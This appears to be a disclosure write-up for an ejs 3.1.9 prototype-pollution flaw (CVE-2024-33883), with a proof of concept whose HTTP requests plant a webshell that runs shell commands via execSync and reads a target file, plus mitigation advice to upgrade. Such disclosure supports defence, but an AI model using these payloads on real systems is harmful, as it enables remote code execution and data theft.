# CVE-2024-33883

### ejs@3.1.9, Insufficient Prototype Pollution Validation Leading to RCE Exploitation

- With prototype pollution, set opts.client to truthy value (condition)
- Then, when render() runs, ejs will run opts.escapeFunction value as JS code.

## Vulnerable Code Range

Based on ejs@3.1.9

**1. ejs/lib/ejs.js - line 580, 636, 637**


## PoC (Inject webshell & activate)

```
1. GET /pollute?target=client&value=1

2. GET /pollute?target=escapeFunction&value=process.mainModule.require("fs").writeFileSync('./payload.js', "function RCE( key ){ \n const result = process.mainModule.require('child_process').execSync(`${key}`); \n throw new Error(`Result leak from Error: ${result.toString()}`); \n}\n module.exports = RCE;");

3. GET /
- Inject webshell

4. GET /pollute?target=escapeFunction&value=process.mainModule.require("./payload.js")("cat ./Leak_target");

5. GET /
- Activate webshell
```

- Above PoC can bypass outbound packet drop of ufw firewall.

- **All version under 3.1.10 is vulnerable for this type of attack.**

- This is RCE vulnerability, and do not abuse on live server.

## Attack available condition

1. Needs control of render().
2. Needs control of prototype pollution attack vector.

- Above two condition holds, RCE attack is available.

## How can I prevent this attack?

- Fixed version(ejs@3.1.10) is available now.
